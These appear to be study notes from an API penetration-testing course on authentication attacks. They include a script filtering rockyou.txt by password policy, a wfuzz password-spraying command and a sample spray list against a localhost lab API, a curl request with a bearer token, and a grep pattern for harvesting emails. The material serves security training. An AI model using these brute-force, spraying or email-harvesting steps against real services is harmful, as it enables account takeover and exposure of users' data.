# Authentication Attacks  

>[Introduction to Authentication Attacks](https://university.apisec.ai/products/api-penetration-testing/categories/2150251352/posts/2161556362)  

## Classic Authentication Attacks  

>[Classic Authentication Attacks](https://university.apisec.ai/products/api-penetration-testing/categories/2150251352/posts/2157505645)  

>Password Brute-Force Attacks  

>Information about creating targeted password lists:  

* [Mentalist](https://github.com/sc0tfree/mentalist)  
* [Common User Passwords Profiler](https://github.com/Mebus/cupp)  

>Get words matching complex password policy of target, bash script:  

```bash
#!/bin/bash

# Input and output file names
input_file="/usr/share/wordlists/rockyou.txt"
output_file="complex-passwords-uniq-sorted-0955.txt"
temp_file="temp-results.txt"

# Set locale to C to avoid issues with multibyte characters in rockyou.txt
export LC_ALL=C

# Clear the temp file if it already exists to avoid duplicate entries
> "$temp_file"

# Use awk to match words that meet all specified conditions and append to temp file
awk '{
  for (i = 1; i <= NF; i++) {
    word = $i
    if (length(word) >= 8 && 
        word ~ /[A-Z]/ && 
        word ~ /[a-z]/ && 
        word ~ /[0-9]/ && 
        word ~ /[!@#$%^&*()_+{}\[\]:;<>,.?~\\/-]/) {
      print word >> "'"$temp_file"'"
    }
  }
}' "$input_file"

# Append sorted unique words from temp file to output file without overwriting
sort "$temp_file" | uniq >> "$output_file"

# Remove duplicate lines in output file to ensure all entries are unique
sort -u "$output_file" -o "$output_file"

# Remove the temporary file after processing
rm "$temp_file"

# Output message
echo "Unique sorted words matching the complex password policy conditions saved to $output_file."
```  

>Password Spraying, using `wfuzz` against the API web application endpoint:  

```
wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://127.0.0.1:8888/identity/api/auth/login --hc 405
```  

>The `--hc` option hides responses with certain response codes. 
>`–hc` option helps you filter out the responses you don’t want to see.  
>The `-H` option add a header to the request. API respond with an HTTP 415 Unsupported Media Type error, if you don’t include the `Content-Type:application/json` header.  

>Sample of passwords to be used during password spray attack:  

```
QWER!@#$
Password1!
Winter2021!
Spring2021?
Fall2021!
Autumn2021?
Summer2022!
Spring2022!
QWER!@#$
March212006!
July152006!
Twitter@2022
JPD1976!
Dorsey@2022
```  

>Extract emails, with regular expressions to pull emails from the saved JSON response.  

>If the output in Burp is too large for the response window, then copy the request into `curl` command and save output to `response.json`  

```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: 127.0.0.1:8888' -H $'sec-ch-ua-platform: \"Linux\"' -H $'Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0MUB0ZXN0LmNvbSIsImlhdCI6MTczMDI3NjkyNCwiZXhwIjoxNzMwODgxNzI0LCJyb2xlIjoidXNlciJ9.ZWyuFqX5-mkyY4i-Iiwk8lnHWR_TJmw0wEOuhODqyRce94JSAc6BdZaDAr6V5QfQpeBJ3LL6rx3e46hRGf2_0CEtHanSvpMqRvxRLMhsgXqkylczWVG1rMEU6tC_4mK3WTx7JeGRsJGBcCaehbAO23f6Vw5s4uVhTGvracy-mO_Qc89nJBdm37S2SVpUfZtgMV_PceIExlg_ZVFJi9xA4ARtaUp8Edh_Q6vO9CePllB_77j7FsbXa1hEa1-bnY1AO2muBMYUEweptjsy30WGWfIm-YsaVy4pM4Ttvjx5LlFTXqTUiXvIJwL9_kiic2rQbsq6ZFJKlV0YSjT3vEXC9A' -H $'Accept-Language: en-US,en;q=0.9' -H $'sec-ch-ua: \"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\"' -H $'Content-Type: application/json' -H $'sec-ch-ua-mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36' -H $'Accept: */*' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: http://127.0.0.1:8888/forum' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    $'http://127.0.0.1:8888/community/api/v2/community/posts/recent?limit=30&offset=0' > response.json
```  

>Get email values from response file using grep:  

```
grep -oe "[a-zA-Z0-9._]\+@[a-zA-Z]\+.[a-zA-Z]\+" response.json
```  

>Note on Base64 Encoding  

>Using Burp Suite Professional, ***Payloads*** window add a `Payload processing` rule.  
>Select `Add > Encoded > Base64-encode` and then click OK.  

----  

## API Token Attacks  

>[API Token Attacks - API Authentication Attacks](https://university.apisec.ai/products/api-penetration-testing/categories/2150251352/posts/2157505646)  

### Token Analysis  

>

### JWT Attacks  

>

### Automating JWT attacks with JWT_Tool  

>
